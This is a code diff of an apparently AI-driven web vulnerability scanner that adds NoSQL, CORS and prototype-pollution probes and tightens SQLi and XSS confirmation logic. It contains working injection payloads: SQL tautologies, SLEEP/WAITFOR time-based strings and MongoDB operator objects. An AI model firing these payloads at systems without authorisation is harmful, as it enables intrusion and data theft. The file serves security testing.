@@ -9,16 +9,18 @@ import { findingVerdict, isInScope } from "@veritas/core";
 import type { LoginCreds, Observation, PlaywrightDriver } from "@veritas/crawler";
 import { InventoryBuilder, normalizePath, smartLogin, guessParamType, extractApiRefs, apiCallToBuiltScreen } from "@veritas/crawler";
 import type { LlmClient } from "@veritas/llm";
-import type { BurpAuditConn, EvidenceStore, FetchHttpClient, HttpRequest, HttpResponse, TechComponent, TechSample } from "@veritas/scanner";
-import { oobPayload, oobPoll, fingerprintTech, formatTechInventory, lookupCves, formatCveResults, impactOracle, identityAppears, auditHeaders } from "@veritas/scanner";
+import type { EvidenceStore, FetchHttpClient, HttpRequest, HttpResponse, OobProvider, TechComponent, TechSample } from "@veritas/scanner";
+import { fingerprintTech, formatTechInventory, lookupCves, formatCveResults, impactOracle, identityAppears, classifyCrossUserBody, auditHeaders, isPublicByDesignClientCredential, isVersionlessComponentLead } from "@veritas/scanner";
 import { placePayload, parseLocation, oobFilesToMultipart, filesHaveOobPlaceholder } from "./inject.js";
 import { analyzeJsSinksFull } from "./jssinks.js";
-import { bumpJwtExp, jwtForgeCandidates } from "./jwt.js";
+import { bumpJwtExp, jwtForgeCandidates, parseJwt, pemFromJwks } from "./jwt.js";
 import { placeUserIdentity, userEnumMarker } from "./user-enum.js";
-import { disclosureHit } from "./disclosure.js";
+import { disclosureHit, looksLikePublicWebFile } from "./disclosure.js";
 import { formatRequestDump, glanceCookie, parseCookieHeader, peekJwt } from "./session-glance.js";
 import { bearerFromOrigins, normalizeOrigins, type StorageOrigin } from "./storage-state.js";
 import { SSRF_CONTROL, SSRF_PAYLOADS, placeSsrfTarget, ssrfHit } from "./ssrf.js";
+import { NOSQL_OP_OBJECTS, NOSQL_OP_QUERY, NOSQL_CONTROL_VALUE, nosqlTimeObject, nosqlErrorSignature, nosqlBypassConfirms, nosqlQueryUrl } from "./nosql.js";
+import { detectUrlWrapper } from "./encoding.js";
 import { XXE_ENTITY_URLS, controlSvg, extractFetchUrls, xssSvg, xxeSvg } from "./upload.js";
 import { tool } from "@anthropic-ai/claude-agent-sdk";
 import { z } from "zod";
@@ -136,9 +138,9 @@ export interface PilotSession {
   scenarioDone: boolean;
   /** Completion signal for the fingerprint (A06 known-vulnerable component) stage. */
   fingerprintDone: boolean;
-  /** Connection to the OOB (Burp Collaborator) infrastructure. If set, probe_oob is usable (via BURP_AUDIT_API).
+  /** Connection to OOB infrastructure (Interactsh or Burp Collaborator). If set, probe_oob is usable.
    *  For out-of-band confirmation of blind SSRF/XXE/SQLi etc. If unset, probe_oob returns not-available. */
-  oob?: BurpAuditConn;
+  oob?: OobProvider;
   // ── attended (manual multi-session auth) ──
   /** Per-role live sessions that were manually logged in. Unset = normal (single-context) mode. */
   roleSessions?: Map<string, RoleSession>;
@@ -150,7 +152,7 @@ export const STAGE_TOOLS = {
   // recon extrapolation: after survey, read the mapped surface and forced-browse LLM-predicted unlinked endpoints.
   reconGuess: ["get_inventory", "probe_guesses", "browser_navigate", "guess_done"],
   methodology: ["get_inventory", "record_methodology", "methodology_done"],
-  diagnose: ["get_screen", "login", "http_request", "probe_params", "probe_xss", "probe_dom_xss", "probe_stored_xss", "probe_ssti", "probe_sqli", "probe_cmdi", "probe_traversal", "probe_redirect", "probe_jwt", "probe_csrf", "probe_oob", "probe_ssrf", "probe_upload", "probe_logic", "probe_race", "probe_reset_poison", "probe_user_enum", "probe_secrets", "probe_headers", "analyze_session", "verify_access", "probe_idor", "analyze_js", "browser_navigate", "browser_fill", "browser_click", "browser_upload", "record_finding", "screen_done", "skip_screen"],
+  diagnose: ["get_screen", "login", "http_request", "probe_params", "probe_xss", "probe_dom_xss", "probe_stored_xss", "probe_ssti", "probe_sqli", "probe_nosql", "probe_cmdi", "probe_traversal", "probe_redirect", "probe_cors", "probe_proto", "probe_jwt", "probe_csrf", "probe_oob", "probe_ssrf", "probe_upload", "probe_logic", "probe_race", "probe_reset_poison", "probe_user_enum", "probe_secrets", "probe_headers", "analyze_session", "verify_access", "probe_idor", "analyze_js", "browser_navigate", "browser_fill", "browser_click", "browser_upload", "record_finding", "screen_done", "skip_screen"],
   // scenario (A04 cross-cutting logic): overview the inventory + fire multi-step request chains via probe_scenario. Once, after per-screen diagnosis.
   scenario: ["get_inventory", "login", "http_request", "browser_navigate", "browser_fill", "browser_click", "probe_scenario", "probe_race", "probe_reset_poison", "probe_user_enum", "probe_secrets", "record_finding", "scenario_done"],
   // fingerprint (A06 known-vulnerable components): fingerprint_scan to collect versions, evaluate known CVEs (cve_lookup opt-in) and record.
@@ -207,6 +209,8 @@ const SEVERITY_BAND: Partial<Record<string, { min: Severity; max: Severity }>> =
   "rate-limit": { min: "info", max: "medium" },
   headers: { min: "info", max: "low" },
   misconfig: { min: "low", max: "high" },
+  "cors-misconfig": { min: "low", max: "high" },
+  "prototype-pollution": { min: "high", max: "critical" },
 };
 
 /** Fit the model's chosen severity into the category's band (clamp to min/max if outside). Bands left undefined pass through. */
@@ -295,6 +299,8 @@ export const CATEGORIES = [
   "workflow-bypass",
   "mass-assignment",
   "race-condition",
+  "cors-misconfig",
+  "prototype-pollution",
   "other",
 ] as const;
 
@@ -303,7 +309,17 @@ export const BUSINESS_LOGIC_CATEGORIES = new Set<string>(["price-tampering", "qt
 
 /** Categories of the "confirmed when a specific marker appears in the response" type (judged by marker presence, not length delta).
  *  Business logic (probe_logic/probe_scenario) + reflected XSS (unescaped reflection) + open-redirect (Location is the OOB). */
-export const MARKER_BASED_CATEGORIES = new Set<string>([...BUSINESS_LOGIC_CATEGORIES, "xss-reflected", "xss-stored", "open-redirect", "ssti", "secret-exposure", "user-enumeration", "race-condition", "account-takeover", "info-disclosure", "ssrf", "xxe"]);
+// path-traversal is marker-based: probe_traversal ALWAYS confirms by reading real file content (/etc/passwd root:x:0:0,
+// win.ini, base64 source) — a traversal that returns no file content is not a traversal. Confirming it on a bare body-
+// length delta (the previous behaviour) both discarded the strong proof the probe already computed and let benign
+// dynamic-length differences read as "confirmed". idor/sqli intentionally stay length/status-based (see probe-confirm.test).
+export const MARKER_BASED_CATEGORIES = new Set<string>([...BUSINESS_LOGIC_CATEGORIES, "xss-reflected", "xss-stored", "open-redirect", "ssti", "secret-exposure", "user-enumeration", "race-condition", "account-takeover", "info-disclosure", "ssrf", "xxe", "path-traversal", "cors-misconfig", "prototype-pollution"]);
+
+/** Injection/execution classes whose in-band SUSPECTED lead requires a MARKER (or a status flip) — a bare body-length
+ *  delta between two different pages is NOT a lead for these. Their real in-band signal is fetched internal content / a
+ *  computed product / a SQL error / a file's contents (an effectMarker), never length alone. Without this a fabricated
+ *  "SSRF to GCP metadata" got recorded off two unrelated SharePoint pages that merely differed by >64 bytes. */
+export const MARKER_REQUIRED_SUSPECT_CATEGORIES = new Set<string>(["ssrf", "sqli", "rce", "ssti", "xxe", "path-traversal"]);
 
 /** Categories that don't allow verdict:"suspected". Two reasons: (1) low-value hygiene classes that just add noise
  *  (rate-limit/headers/info-disclosure/misconfig — were being mass-produced as "suspected"); (2) XSS, where even the general
@@ -689,7 +705,12 @@ export function looksBlocked(res: { status: number; headers?: Record<string, str
   if (h["cf-mitigated"]) return true; // Cloudflare bot-management (challenge/block) — definitive
   if (res.status === 429 || res.status === 503) return true;
   const b = (res.body ?? "").slice(0, 2000);
-  if (/just a moment\.\.\.|challenges\.cloudflare\.com|cf-mitigated|attention required|_incapsula_|imperva|akamai/i.test(b)) return true;
+  if (/just a moment\.\.\.|challenges\.cloudflare\.com|cf-mitigated|attention required/i.test(b)) return true;
+  // Bare CDN/WAF vendor names (Akamai/Incapsula/Imperva) appear in NORMAL 200 app pages — those vendors inject asset
+  // refs (assets.akamaized.net, /_Incapsula_Resource) into every page's <head>. Treat them as a block ONLY on a non-2xx
+  // status (a real 403/5xx challenge), else every confirmed finding on a CDN-fronted site (much of enterprise/VDP scope)
+  // is wrongly demoted as a "block page".
+  if ((res.status < 200 || res.status >= 300) && /_incapsula_|imperva|akamai/i.test(b)) return true;
   if (res.status === 403 && /captcha|challenge|verify you are (?:a )?human|are you a robot|enable javascript/i.test(b)) return true;
   return false;
 }
@@ -718,19 +739,27 @@ export function reflectionIsLive(body: string, marker: string): boolean {
   // Containers whose content is NOT parsed as active HTML markup — a tag reflected inside them is INERT and cannot
   // execute: <script> is JS; <title>/<textarea> are RCDATA (tags don't instantiate); <style> is raw text; <!-- --> is a
   // comment. Only excluding <script> (the old behaviour) false-confirmed reflections into a page <title> or a JSON blob.
-  const inertPairs: Array<[string, string]> = [
-    ["<script", "</script>"],
-    ["<title", "</title>"],
-    ["<textarea", "</textarea>"],
-    ["<style", "</style>"],
-    ["<!--", "-->"],
+  // Match container tags on TAG BOUNDARIES (open name followed by whitespace / > / /), not raw substrings — otherwise
+  // "<title" matched a custom element "<title-bar>" (whose "</title-bar>" does NOT contain "</title>"), so a LIVE
+  // reflection after such a tag was wrongly judged inert. Comment close accepts the non-standard --!> too.
+  const inertPairs: Array<[RegExp, RegExp]> = [
+    [/<script(?=[\s/>])/g, /<\/script\s*>/g],
+    [/<title(?=[\s/>])/g, /<\/title\s*>/g],
+    [/<textarea(?=[\s/>])/g, /<\/textarea\s*>/g],
+    [/<style(?=[\s/>])/g, /<\/style\s*>/g],
+    [/<!--/g, /--!?>/g],
   ];
+  const lastMatch = (re: RegExp, s: string): number => {
+    let idx = -1;
+    for (const m of s.matchAll(re)) idx = m.index ?? idx;
+    return idx;
+  };
   let from = 0;
   for (;;) {
     const i = body.indexOf(marker, from);
     if (i < 0) return false;
     const pre = body.slice(0, i).toLowerCase(); // HTML tags are case-insensitive; the marker match above stays case-sensitive
-    const inert = inertPairs.some(([open, close]) => pre.lastIndexOf(open) > pre.lastIndexOf(close));
+    const inert = inertPairs.some(([open, close]) => lastMatch(open, pre) > lastMatch(close, pre));
     if (!inert) return true; // this occurrence is in a LIVE HTML position (not inside any inert container)
     from = i + marker.length; // inert → skip, try the next occurrence
   }
@@ -741,6 +770,72 @@ export function reflectionIsLive(body: string, marker: string): boolean {
  *  so a "signal" below the page's natural variance is NOT confirmed (it degrades to a lead instead of a false positive). */
 export function diffThreshold(noise: number, floor = 64, k = 2): number {
   return Math.max(floor, Math.round(Math.abs(noise) * k));
+}
+
+/** Matched TRUE/FALSE pairs — same length, same quoting. Mixing `' OR '1'='2'` with unquoted ` OR 1=1` is how
+ *  Drupal/marketing search HTML became "boolean SQLi": two different search strings, not a SQL tautology. */
+export const SQLI_BOOLEAN_PAIRS: ReadonlyArray<{ t: string; f: string }> = [
+  { t: "' OR '1'='1'-- -", f: "' OR '1'='2'-- -" },
+  { t: "' AND '1'='1'-- -", f: "' AND '1'='2'-- -" },
+  { t: " OR 1=1-- -", f: " OR 1=2-- -" },
+  { t: "') OR ('1'='1", f: "') OR ('1'='2" },
+];
+
+const SQL_ERR_RE =
+  /sql syntax|you have an error in your sql|warning:\s*mysql|ORA-\d{3,}|PostgreSQL.*ERROR|SQLite3?::|ODBC[^;]*SQL|unclosed quotation|quoted string not properly terminated|SQLSTATE\[/i;
+
+/** Full HTML document (Drupal/marketing search). JSON APIs and TIME-BASED proof strings are not this. */
+export function looksLikeHtmlDocument(body: string): boolean {
+  const head = body.slice(0, 512).toLowerCase();
+  return head.includes("<!doctype html") || /<html[\s>]/.test(head);
+}
+
+/** JSON or XML — the only body kinds where a boolean length delta is a SQL oracle, not a search-result page. */
+export function looksLikeStructuredBody(body: string): boolean {
+  const t = body.trimStart();
+  if (t.startsWith("{") || t.startsWith("[")) return true;
+  return t.slice(0, 5).toLowerCase() === "<?xml";
+}
+
+/** Drop the payload (raw + encoded + HTML-escaped) so a search box echoing the query cannot create a length oracle. */
+export function stripPayloadEcho(body: string, payload: string): string {
+  if (!payload) return body;
+  const esc = payload.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;").replace(/'/g, "&#39;");
+  const variants = [payload, encodeURIComponent(payload), esc, payload.replace(/'/g, "&#x27;"), payload.replace(/'/g, "&apos;")];
+  let s = body;
+  for (const v of variants) {
+    if (v.length > 0) s = s.split(v).join("");
+  }
+  return s;
+}
+
+/** Boolean length may confirm SQLi only on JSON/XML, and only with equal-length matched pairs. */
+export function booleanLengthConfirmsSqli(trueBody: string, falseBody: string, truePayload: string, falsePayload: string, noiseThr: number): boolean {
+  if (truePayload.length !== falsePayload.length) return false;
+  if (!looksLikeStructuredBody(trueBody) || !looksLikeStructuredBody(falseBody)) return false;
+  const t = normalizeVolatile(stripPayloadEcho(trueBody, truePayload));
+  const f = normalizeVolatile(stripPayloadEcho(falseBody, falsePayload));
+  // A structured TRUE-vs-FALSE differential is SQLi whether it shows as a length delta OR a same-length CONTENT flip
+  // ({"ok":1} vs {"ok":0}, both 8 bytes). Length-only missed the content flip entirely. Payloads (equal length) and
+  // volatile tokens are already stripped, so a residual content difference is the boolean oracle firing.
+  if (Math.abs(t.length - f.length) > noiseThr) return true;
+  return t !== f && t.length > 0;
+}
+
+/** True → refuse confirmed SQLi: cited bodies are HTML/text length, not JSON/XML, a SQL error, a time-based proof, or a
+ *  status flip. Optional statuses let a 401/403→200 auth-bypass (even with HTML bodies) escape the HTML-length veto. */
+export function sqliHtmlLengthOnlyFp(_controlBody: string, positiveBodies: ReadonlyArray<string>, controlStatus?: number, positiveStatuses?: ReadonlyArray<number>): boolean {
+  if (positiveBodies.some((b) => SQL_ERR_RE.test(b))) return false;
+  if (positiveBodies.some((b) => /TIME-BASED BLIND SQLi CONFIRMED/i.test(b))) return false;
+  // A STATUS FLIP (e.g. a 401/403 control → 200 positives) is a real SQL auth-bypass signal, not HTML-length variance —
+  // even when the positive bodies are HTML (an authenticated dashboard). Judge the EFFECT, not the body kind.
+  if (controlStatus !== undefined && positiveStatuses && positiveStatuses.length > 0 && positiveStatuses.every((s) => s >= 200 && s < 300 && s !== controlStatus)) return false;
+  // The injection EFFECT lives in the POSITIVE bodies (the exfiltrated rows / the auth token in JSON). Judge those, NOT
+  // the control: an auth-bypass control is frequently a PLAIN-TEXT 401 ("Invalid email or password"), and requiring the
+  // control to be structured too wrongly demoted a real JSON auth-bypass (Juice Shop ' OR 1=1-- : text 401 vs a 200
+  // {authentication:{token}} positive). If the positives are structured JSON/XML, this is not the HTML-length FP.
+  if (positiveBodies.length > 0 && positiveBodies.every(looksLikeStructuredBody)) return false;
+  return true;
 }
 
 export type AccessVerdict = "not_bypass" | "needs_judgment" | "inconclusive";
@@ -755,10 +850,14 @@ export function protectedContentLeaked(unauthBody: string, authBody: string): bo
   const a = normalizeVolatile(authBody).replace(/\s+/g, " ").trim();
   if (u.length < 32 || a.length < 32) return false;
   if (u === a) return true; // identical protected content served without auth
-  for (const frac of [0.25, 0.5, 0.75]) {
-    const start = Math.floor(a.length * frac);
-    const chunk = a.slice(start, start + 60);
-    if (chunk.length >= 40 && u.includes(chunk)) return true; // unauth reproduces a substantial chunk of the authed content
+  // Sample contiguous windows from the SMALLER body and search the larger: a genuine leak is often a SUBSET (the unauth
+  // response shows a few of the protected records) — sampling only the larger authed body lands the windows inside
+  // authed-only records the unauth body never had, missing a real partial exposure.
+  const [small, big] = u.length <= a.length ? [u, a] : [a, u];
+  for (const frac of [0.2, 0.4, 0.6, 0.8]) {
+    const start = Math.floor(small.length * frac);
+    const chunk = small.slice(start, start + 60);
+    if (chunk.length >= 40 && big.includes(chunk)) return true; // one body reproduces a substantial chunk of the other's content
   }
   return false;
 }
@@ -816,12 +915,23 @@ export function frontierLinks(
   return [...out];
 }
 
-/** Tally diagnosis-probe response statuses (for the auth-wall circuit breaker). 401 = wall, 2xx = got through. */
-function bumpHttp(s: PilotSession, status: number): void {
+/** Tally diagnosis-probe response statuses (for the auth-wall circuit breaker). 401 = wall, 2xx = got through.
+ *  `active` (default true) = a real vuln probe that counts toward the screen_done coverage gate. PASSIVE/hygiene probes
+ *  (probe_headers) pass active:false so a screen can't be closed "tested-clean" on header checks alone (mapped, never
+ *  attacked). httpProbes/httpThrough still tally every request — the auth-wall breaker wants the full sample. */
+function bumpHttp(s: PilotSession, status: number, opts: { active?: boolean } = {}): void {
   s.httpProbes += 1;
-  s.screenProbes += 1; // per-screen diagnosis activity (cross-checks the screen_done gate)
+  if (opts.active !== false) s.screenProbes += 1; // active per-screen diagnosis activity (cross-checks the screen_done gate)
   if (status === 401) s.httpAuthWall += 1;
   else if (status >= 200 && status < 300) s.httpThrough += 1;
+}
+
+/** A response that is actually an upstream PROXY/connection error page (Burp "SOCKS: Host unreachable", a 502 tunnel
+ *  failure, ERR_PROXY_CONNECTION_FAILED) rather than the target itself. When routing through --burp-proxy and the host
+ *  is unreachable, Burp returns such a page (often as HTTP 200); auditing it produces false "missing header" findings on
+ *  a host that was never actually reached, so probe_headers / record_finding must refuse it. */
+export function looksLikeProxyError(body: string): boolean {
+  return /SOCKS:\s|Host unreachable|<title>\s*Burp Suite\s*<\/title>|ERR_(?:PROXY|TUNNEL|CONNECTION)|tunnel connection failed|proxy(?:\s|-)error/i.test(body.slice(0, 2000));
 }
 
 /** Pull the planned attack classes out of a screen plan's `classes=[a,b,c]` prefix, canonicalized (for the coverage gate).
@@ -2284,7 +2394,7 @@ export function buildTools(s: PilotSession) {
           JSON.stringify({
             negativeControl: ctrl.evId,
             positiveReplays: [p1.evId, p2.evId],
-            effectMarker: `${a}*${b}=${product}`,
+            effectMarker: product,
             control: { evaluated: ctrl.evaluated },
             payload: [{ evaluated: p1.evaluated, echoedLiteral: p1.echoedLiteral }, { evaluated: p2.evaluated, echoedLiteral: p2.echoedLiteral }],
             verdict: verdict.ok
@@ -2298,7 +2408,7 @@ export function buildTools(s: PilotSession) {
     ),
     tool(
       "probe_sqli",
-      "Confirm SQL INJECTION — boolean-based (in-band) AND time-based (BLIND). Inject into `param` (query) or a `body` containing {{SQLI}} — OR aim any other location with `location`: \"header:X-Forwarded-For\" / \"cookie:sid\" / \"path:-1\" (a path segment) / \"json:/user/id\" (a field in a JSON body). Set `contentType` (e.g. application/json) so a content-type-dispatching API actually parses your body payload. Runs: an error probe (a lone quote → SQL-error signature), a boolean pair (TRUE vs FALSE — a stable content DIFFERENCE = injection), and a time-based test (SLEEP(5)/pg_sleep(5)/WAITFOR — a consistent ~5s DELAY vs a fast baseline = blind injection; MySQL/Postgres/MSSQL tried) — the time oracle works from ANY location, so header/cookie/path blind SQLi is now confirmable. Returns negativeControl + positiveReplays evidenceIds + the confirming technique, ready for record_finding(category sqli). USE on any value reaching a query: search/id/sort/filter/login, XFF/User-Agent (logging INSERTs). (An error signature alone is a HINT — confirm with boolean or time.)",
+      "Confirm SQL INJECTION — boolean-based (in-band, JSON/XML bodies only) AND time-based (BLIND). Inject into `param` (query) or a `body` containing {{SQLI}} — OR aim any other location with `location`: \"header:X-Forwarded-For\" / \"cookie:sid\" / \"path:-1\" (a path segment) / \"json:/user/id\" (a field in a JSON body). Set `contentType` (e.g. application/json) so a content-type-dispatching API actually parses your body payload. Runs: an error probe (a lone quote → SQL-error signature), matched TRUE/FALSE pairs of equal length (a stable JSON/XML content DIFFERENCE = injection — HTML search-page length is NOT confirmation), and a time-based test (SLEEP(5)/pg_sleep(5)/WAITFOR — a consistent ~5s DELAY vs a fast baseline = blind injection; MySQL/Postgres/MSSQL tried) — the time oracle works from ANY location, so header/cookie/path blind SQLi is now confirmable. Returns negativeControl + positiveReplays evidenceIds + the confirming technique, ready for record_finding(category sqli). USE on any value reaching a query: search/id/sort/filter/login, XFF/User-Agent (logging INSERTs). (An error signature alone is a HINT — confirm with boolean or time. Do NOT record_finding(sqli) from Drupal/marketing HTML length.)",
       { url: z.string(), param: z.string().optional(), method: z.string().optional(), body: z.string().optional(), location: z.string().optional(), contentType: z.string().optional() },
       async ({ url, param, method, body, location, contentType }) => {
         const buildReq = (val: string): HttpRequest | null => {
@@ -2355,35 +2465,40 @@ export function buildTools(s: PilotSession) {
           const noise = benign2 ? Math.abs(benign.nlen - benign2.nlen) : 0;
           const thr = diffThreshold(noise);
           // ── error-based(ヒント) ──
-          const SQL_ERR = /sql syntax|you have an error in your sql|warning:\s*mysql|ORA-\d{3,}|PostgreSQL.*ERROR|SQLite3?::|ODBC[^;]*SQL|unclosed quotation|quoted string not properly terminated|SQLSTATE\[/i;
           const err = await send("'", "positive_replay", "error-probe(quote)");
-          const errSig = err ? SQL_ERR.exec(err.body)?.[0] : undefined;
-          // ── boolean-based(in-band 差分) ──
-          const falseR = await send("' OR '1'='2'-- -", "negative_control", "boolean FALSE");
-          // A boolean length differential only means anything on a real 2xx app response. If the app is behind a WAF /
-          // bot-challenge (403 "Just a moment", 429/503, cf-mitigated), the "response" is a block page and its length
-          // varies with a rotating nonce — NOT injection. Skip boolean confirmation when blocked (that FP'd namejet.com).
+          const errSig = err ? SQL_ERR_RE.exec(err.body)?.[0] : undefined;
+          // ── boolean-based: matched TRUE/FALSE pairs only. Never mix a quoted FALSE with an unquoted TRUE
+          //   (that FP'd Drupal HTML search: two different search strings, not a SQL tautology). HTML/text length
+          //   is not an oracle — only JSON/XML (Juice Shop /rest/products/search still confirms). ──
           const usable = (x: { status: number; body: string }): boolean => x.status >= 200 && x.status < 300 && !looksBlocked(x);
-          if (falseR && looksBlocked(falseR)) {
-            return txt(JSON.stringify({ technique: null, blocked: true, verdict: `BLOCKED: the target returned a WAF / bot-challenge page (status ${falseR.status}) instead of the app — probes are not reaching it, so SQLi cannot be confirmed here. Do NOT record a finding from these responses.` }));
-          }
-          let subNoise = false; // a difference was seen but below the page's noise floor → suspected, not confirmed
-          for (const tp of ["' OR '1'='1'-- -", " OR 1=1-- -", "') OR ('1'='1"]) {
-            const t1 = await send(tp, "positive_replay", `boolean TRUE ${tp}`);
-            if (!t1 || !falseR || !usable(t1) || !usable(falseR)) continue;
-            // Compare on the NORMALIZED length against the noise-aware threshold (not raw ±64).
-            const delta = (x: { nlen: number }): number => Math.abs(x.nlen - falseR.nlen);
-            const diff = (x: { status: number; nlen: number }): boolean => x.status !== falseR.status || delta(x) > thr;
-            if (diff(t1)) {
-              const t2 = await send(tp, "positive_replay", `boolean TRUE#2 ${tp}`);
-              if (t2 && usable(t2) && diff(t2) && Math.abs(t2.nlen - t1.nlen) <= thr)
-                return txt(JSON.stringify({ technique: "boolean", negativeControl: falseR.evId, positiveReplays: [t1.evId, t2.evId], verdict: `SQLi CONFIRMED (boolean): TRUE(${tp}) normalized-len ${t1.nlen}/${t2.nlen} vs FALSE ${falseR.nlen} (delta > noise-floor ${thr}). record_finding(category sqli) with these evidenceIds.${errSig ? ` (SQL error also seen: ${errSig})` : ""}` }));
-            } else if (t1.status === falseR.status && delta(t1) > 0) {
-              subNoise = true; // there IS a length change, but within the page's natural variance
+          let subNoise = false;
+          let unstructuredLength = false;
+          for (const pair of SQLI_BOOLEAN_PAIRS) {
+            const falseR = await send(pair.f, "negative_control", `boolean FALSE ${pair.f}`);
+            if (falseR && looksBlocked(falseR)) {
+              return txt(JSON.stringify({ technique: null, blocked: true, verdict: `BLOCKED: the target returned a WAF / bot-challenge page (status ${falseR.status}) instead of the app — probes are not reaching it, so SQLi cannot be confirmed here. Do NOT record a finding from these responses.` }));
             }
+            const t1 = await send(pair.t, "positive_replay", `boolean TRUE ${pair.t}`);
+            if (!t1 || !falseR || !usable(t1)) continue; // TRUE must be a real 2xx app response; FALSE MAY be non-2xx (the classic "no row" status flip)
+            const unstructured = !looksLikeStructuredBody(t1.body) || !looksLikeStructuredBody(falseR.body);
+            if (t1.status !== falseR.status) {
+              // A STABLE status flip between matched TRUE/FALSE payloads (TRUE 200 with a row vs FALSE 404 / no-content) is
+              // a boolean SQLi oracle regardless of body kind — the flip is the boolean RESULT, not HTML length variance
+              // (the two payloads are both valid injections differing only in '1'='1' vs '1'='2'). Confirm with a replay.
+              const t2 = await send(pair.t, "positive_replay", `boolean TRUE#2 ${pair.t}`);
+              if (t2 && usable(t2) && t2.status === t1.status)
+                return txt(JSON.stringify({ technique: "boolean", negativeControl: falseR.evId, positiveReplays: [t1.evId, t2.evId], verdict: `SQLi CONFIRMED (boolean): TRUE(${pair.t}) status ${t1.status} vs FALSE(${pair.f}) status ${falseR.status}, stable across replays. record_finding(category sqli) with these evidenceIds.${errSig ? ` (SQL error also seen: ${errSig})` : ""}` }));
+              continue;
+            }
+            if (!booleanLengthConfirmsSqli(t1.body, falseR.body, pair.t, pair.f, thr)) {
+              if (unstructured) unstructuredLength = true;
+              else if (t1.status === falseR.status && Math.abs(t1.nlen - falseR.nlen) > 0) subNoise = true;
+              continue;
+            }
+            const t2 = await send(pair.t, "positive_replay", `boolean TRUE#2 ${pair.t}`);
+            if (t2 && usable(t2) && booleanLengthConfirmsSqli(t2.body, falseR.body, pair.t, pair.f, thr) && Math.abs(t2.nlen - t1.nlen) <= thr)
+              return txt(JSON.stringify({ technique: "boolean", negativeControl: falseR.evId, positiveReplays: [t1.evId, t2.evId], verdict: `SQLi CONFIRMED (boolean): TRUE(${pair.t}) vs FALSE ${pair.f} on a structured (JSON/XML) response (delta > noise-floor ${thr}). record_finding(category sqli) with these evidenceIds.${errSig ? ` (SQL error also seen: ${errSig})` : ""}` }));
           }
-          if (subNoise)
-            return txt(JSON.stringify({ technique: "boolean", suspected: true, verdict: `SUSPECTED (not confirmed): a boolean length difference was seen but it is WITHIN the page's natural variance (noise floor ${thr}) — not reliably distinguishable from dynamic content. Record as SUSPECTED (a lead), not confirmed, unless you get a second independent signal (time-based delay or a SQL error). ${errSig ? `SQL error signature also seen: ${errSig}.` : ""}` }));
           // ── time-based(blind: 一定の遅延) ── reuse the noise baseline (benign2) instead of sending a third baseline.
           const baselineMs = Math.min(benign.ms, benign2?.ms ?? benign.ms);
           for (const sp of ["' AND SLEEP(5)-- -", " AND SLEEP(5)-- -", "' AND pg_sleep(5)-- -", "'; WAITFOR DELAY '0:0:5'-- -", "' OR SLEEP(5)-- -"]) {
@@ -2400,6 +2515,14 @@ export function buildTools(s: PilotSession) {
                 return txt(JSON.stringify({ technique: "time-based", negativeControl: ctl.evId, positiveReplays: [p1.evId, p2.evId], verdict: `BLIND SQLi CONFIRMED (time-based): SLEEP(5) added ~${a.ms - baselineMs}ms x2 vs ${baselineMs}ms baseline (payload ${sp}). record_finding(category sqli, high+) with these evidenceIds.` }));
             }
           }
+          if (unstructuredLength)
+            return txt(JSON.stringify({
+              technique: null,
+              errorSignature: errSig ?? null,
+              verdict: `not confirmed: HTML/document length changed with the query — that is result-page variance (Drupal/marketing search), not boolean SQLi. Do NOT record_finding(sqli) from that delta. Time-based did not confirm.${errSig ? ` SQL error signature seen ("${errSig}") — a hint, not confirmation.` : ""} A JSON/API boolean differential would confirm.`,
+            }));
+          if (subNoise)
+            return txt(JSON.stringify({ technique: "boolean", suspected: true, verdict: `SUSPECTED (not confirmed): a boolean length difference was seen but it is WITHIN the page's natural variance (noise floor ${thr}) — not reliably distinguishable from dynamic content. Record as SUSPECTED (a lead), not confirmed, unless you get a second independent signal (time-based delay or a SQL error). ${errSig ? `SQL error signature also seen: ${errSig}.` : ""}` }));
           return txt(
             JSON.stringify({
               technique: null,
@@ -2415,8 +2538,140 @@ export function buildTools(s: PilotSession) {
       },
     ),
     tool(
+      "probe_nosql",
+      "Confirm NoSQL / OPERATOR INJECTION (MongoDB / Mongoose / MarsDB) — a document store IGNORES probe_sqli's SQL payloads, so run THIS on a Mongo-backed target. Two shapes: (1) pass a JSON `body` with a {{NOSQL}} placeholder AT THE INJECTED VALUE (e.g. {\"email\":\"admin@x\",\"password\":{{NOSQL}}}) — it substitutes operator objects ({$ne:null}/{$gt:''}/{$regex:.*}) to make a field always-true (auth/filter bypass) and a $where sleep for BLIND time-based; (2) pass `param` (query) to test the field[$ne]= bracket form. For a LOGIN endpoint pass `successMarker` (the string that appears only on success, e.g. \"authentication\" / \"token\") — confirm = the benign control FAILS and the operator payload SUCCEEDS twice. Returns negativeControl + positiveReplays evidenceIds + the technique → record_finding(category sqli) titled NoSQL. USE on login/search/filter endpoints on Node/Express+Mongo apps.",
+      { url: z.string(), param: z.string().optional(), body: z.string().optional(), method: z.string().optional(), contentType: z.string().optional(), successMarker: z.string().optional() },
+      async ({ url, param, body, method, contentType, successMarker }) => {
+        const ct = contentType ?? "application/json";
+        const mkReq = (u: string, b: string | null): HttpRequest | null => {
+          const hdrs = authHeaders(s);
+          if (b != null) hdrs["content-type"] = ct;
+          const req: HttpRequest = { method: (method ?? (b != null ? "POST" : "GET")).toUpperCase(), url: u, headers: hdrs, body: b };
+          return isInScope(req.url, s.scope) ? req : null;
+        };
+        const fire = async (u: string, b: string | null, kind: "negative_control" | "positive_replay", tag: string) => {
+          const req = mkReq(u, b);
+          if (!req) return null;
+          const res = await s.http.send(req);
+          bumpHttp(s, res.status);
+          const ev = s.evidence.record({
+            screenId: s.currentScreenId ?? "pilot",
+            validator: "claude-pilot-nosql",
+            kind,
+            request: { ...req, headers: s.http.effectiveHeaders(req.headers) },
+            response: res,
+            note: `nosql ${tag}`,
+          });
+          return { evId: ev.id, status: res.status, body: res.body, ms: res.durationMs };
+        };
+        try {
+          if (body == null && !param) return txt("ERROR: pass `body` (JSON) with a {{NOSQL}} placeholder at the injected value, or `param` (query) for the [$ne]= form.");
+          const controlSpec = body != null
+            ? { u: url, b: body.replace(/\{\{NOSQL\}\}/g, NOSQL_CONTROL_VALUE) }
+            : { u: (() => { try { const uu = new URL(url); uu.searchParams.set(param!, "__verdict_nonexistent_zzz__"); return uu.toString(); } catch { return url; } })(), b: null as string | null };
+          const control = await fire(controlSpec.u, controlSpec.b, "negative_control", "control(benign literal)");
+          if (!control) return txt("ERROR: control request out of scope / bad url.");
+          let errSig = nosqlErrorSignature(control.body);
+          const ops = body != null
